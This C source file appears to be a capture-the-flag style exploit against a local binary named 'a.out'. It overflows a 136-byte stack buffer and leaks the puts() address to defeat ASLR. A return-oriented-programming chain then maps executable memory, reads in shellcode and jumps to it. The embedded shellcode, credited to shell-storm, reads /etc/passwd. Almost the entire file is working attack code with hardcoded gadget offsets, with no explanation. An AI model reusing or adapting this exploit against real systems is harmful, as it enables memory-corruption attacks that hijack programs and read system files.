#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include <stdio.h>
#include "utils.h"

#define WRITE_PIPE writePipe[1]
#define READ_PIPE readPipe[0]

unsigned long libcAdress = 0;
#define LIBC(address) (libcAdress + address)

const int PUTS_OFFSET = 0x76210;
const int MMAP_PROTECT = PROT_EXEC | PROT_WRITE | PROT_READ;
const int MMAP_FLAG = MAP_ANONYMOUS | MAP_PRIVATE;

char shellcode[] = "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41";
//http://shell-storm.org/shellcode/files/shellcode-878.php

int main(void)
{
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    char *const argv[] = {"a.out", NULL};
    int readPipe[2];
    int writePipe[2];
    char buff[400];
    char inbuf[100];

    pipe(readPipe);
    pipe(writePipe);

    if (!fork()) {
        dup2(writePipe[0], STDIN_FILENO);
        dup2(readPipe[1], STDOUT_FILENO);
        close(writePipe[1]);
        close(readPipe[0]);
        execv("a.out", argv);
    }

    memset(buff, 'A', 136);

    unsigned long *rop = (unsigned long *) (buff + 136);
    *rop ++= 0x0040120b; // pop rdi
    *rop ++= 0x00404018; // got address puts()
    *rop ++= 0x00401030; // puts@plt
    *rop ++= 0x00401060; // address gets in strart level
    *rop ++= 0; // trash for rbx

    readAllAndPrintLine(READ_PIPE);
    sendStr(WRITE_PIPE, buff, 136 + (8 * 4));

    unsigned long adress = 0;
    read(READ_PIPE, &adress, 6);

     libcAdress = adress - PUTS_OFFSET;

    printf("-> %p", libcAdress + 0x000f8770);

    rop = (unsigned long *) (buff + 136);
    *rop ++= 0x0040120b; // pop rdi -> arg 1
    *rop ++= 0; // 0 address
    *rop ++= 0x00401209; // pop rsi ; pop r15 ; ret  ; -> rsi, 2 arg
    *rop ++= strlen(shellcode); // len shellcode
    *rop ++= 666; // trash for r15;
    *rop ++= LIBC(0x000e46c9); //pop rdx ; pop rcx ; pop rbx ; ret  ;  (1 found)
    *rop ++= MMAP_PROTECT; // Read Write Exec prot
    *rop ++= MMAP_FLAG; // flag for page memory;
    *rop ++= 666; // trash for rbx;
    *rop ++= LIBC(0x0012a0c6);//0x0012a0c6 pop r8 ; mov eax, 0x00000001 ; ret  ;  (1 found)
    *rop ++= -1; // -1 fd for 5 arg mmap;
    *rop ++= LIBC(0x0007f1db); // 0x0007f1ba pop rbx ; ret  ;  (1 found)
    *rop ++= 0; // 0 for 6 arg mmap

    *rop ++= LIBC(0x00081324); // pop r12 ; ret  ;  (1 found)
    *rop ++= LIBC(0x000470b2); // pop r15 ; ret  ;

    *rop ++= LIBC(0x000e7752); //0x000e773b mov r9, rbx ; call r12 ;  (1 found)
    *rop ++= LIBC(0x000f8770); //mmap address

    *rop ++= LIBC(0x0007f1db); // 0x0007f1ba pop rbx ; ret  ;  (1 found)
    *rop ++= LIBC(0x00081c65); //0x00081c5c pop r13 ; pop r14 ; pop r15 ; ret  ;

    *rop ++= LIBC(0x0002886f);//push rax ; call rbx ;  (1 found)
    *rop ++= 0;
    *rop ++= LIBC(0x0007bed6); //0x0007becf mov rdi, r14 ; call r12 ;  (1 found)
    *rop ++= LIBC(0x00075780); // gets
    *rop ++= 0x004010bc; // jmp rax ;

    sendStr(WRITE_PIPE, buff, 136 + (8 * 24));
    sendStr(WRITE_PIPE, shellcode, strlen(shellcode));
    readAllAndPrintLine(READ_PIPE);

}
